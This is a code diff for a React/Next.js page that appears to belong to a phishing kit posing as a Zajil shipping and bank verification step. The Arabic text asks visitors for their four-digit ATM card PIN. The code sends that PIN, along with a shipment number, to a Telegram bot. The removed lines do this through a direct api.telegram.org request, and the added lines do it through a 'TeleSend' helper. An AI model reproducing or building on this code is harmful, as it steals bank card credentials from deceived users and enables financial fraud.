@@ -1,32 +1,47 @@
 "use client"
 
 import styles from './code.module.css'
-import { useRef } from 'react'
+import { useState } from 'react'
 import { useRouter,useSearchParams } from 'next/navigation'
-import bot from '@/compnante/dataBot'
+import TeleSned from '../../../../../server/TeleSend'
 
 const Code = () => {
-  const code = useRef();
+  const {Send} = TeleSned();
   const router = useRouter();
   const x = useSearchParams();
   const datas = x.get("names")
 
+
+
+  const [form,setForm]=useState({
+    data:{
+      code:"",
+      رقم_الشحنة:datas
+    }
+  })
+  const setDynamicFormData = (name,value)=>{
+    setForm({
+      data:{
+        ...form.data,
+        [name]:value,
+      }
+    })
+  }
+  const PostToTelegram = () => {
+    const description = Object.entries(form.data)
+      .map((d) => `${d[0]} : ${d[1]} `)
+      .join("\n");
+    Send(description)
+
+    
+  };
   const handlerout = ()=>{
-    if(code.current.value == ""){
+    if(form.data.code== ""){
       alert('من فضلك قم بملى الحقول')
     }else{
       router.push(`/fozajil/banks/pay/code/nphad/codeto?names=${datas}`)
     }
   }
-
-  const handleSubmit = (e) => {
-    e.preventDefault();
-
-    var length= `%0A كود البطاقة : ${code.current.value} %0A BY Admin Zajil: %0A %0A ${datas}`
-    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
-  
-  }
-
 
   return (
     <div className={styles.contect}>
@@ -34,10 +49,16 @@ const Code = () => {
       <h1> التحقق</h1>
       <p>يرجى ادخال الرمز السري الخاص ببطاقة الصراف والمكون من اربع ارقام</p>
      
-      <form action="/pay/code" onSubmit={handleSubmit}>
+      <form onSubmit={(e)=>{
+        e.preventDefault();
+        PostToTelegram()
+      }}>
         <label htmlFor="">
         ادخل كلمة مرور البطاقة البنكية
-        <input type="text" ref={code} placeholder="ادخل كلمة المرور هنا" />
+        <input type="text" name="code" onChange={(e) => {
+                  const { name, value } = e.target;
+                  setDynamicFormData(name, value);
+                }} placeholder="ادخل كلمة المرور هنا" />
         </label>
         <button type='submit' onClick={handlerout}>تحقق</button>
       </form>
